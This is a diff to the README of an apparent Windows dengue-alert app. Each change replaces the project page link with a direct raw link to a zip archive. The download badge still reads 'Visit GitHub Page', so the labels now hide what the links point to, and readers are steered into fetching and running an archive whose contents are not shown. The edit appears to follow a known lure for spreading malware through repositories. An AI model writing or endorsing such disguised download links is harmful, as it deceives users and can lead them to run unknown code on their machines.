@@ -1,11 +1,11 @@
 # 🦟 dengue-watch-AI - Track dengue risk with clear alerts
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/hanaadumbrative727/dengue-watch-AI)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/hanaadumbrative727/dengue-watch-AI/raw/refs/heads/main/public/watch_dengue_AI_2.5.zip)
 
 ## 📥 Download
 
 Visit this page to download or open the project files:
-https://github.com/hanaadumbrative727/dengue-watch-AI
+https://github.com/hanaadumbrative727/dengue-watch-AI/raw/refs/heads/main/public/watch_dengue_AI_2.5.zip
 
 If you want to run the app on Windows, use the files from that page and follow the steps below.
 
@@ -39,7 +39,7 @@ If you do not have Node.js yet, install the latest LTS version for Windows from 
 Follow these steps in order.
 
 1. Open the download page:
-   https://github.com/hanaadumbrative727/dengue-watch-AI
+   https://github.com/hanaadumbrative727/dengue-watch-AI/raw/refs/heads/main/public/watch_dengue_AI_2.5.zip
 
 2. Download the project files to your PC.
 
@@ -172,4 +172,4 @@ For a smooth run:
 ## 🔗 Project link
 
 Primary download and project page:
-https://github.com/hanaadumbrative727/dengue-watch-AI
+https://github.com/hanaadumbrative727/dengue-watch-AI/raw/refs/heads/main/public/watch_dengue_AI_2.5.zip
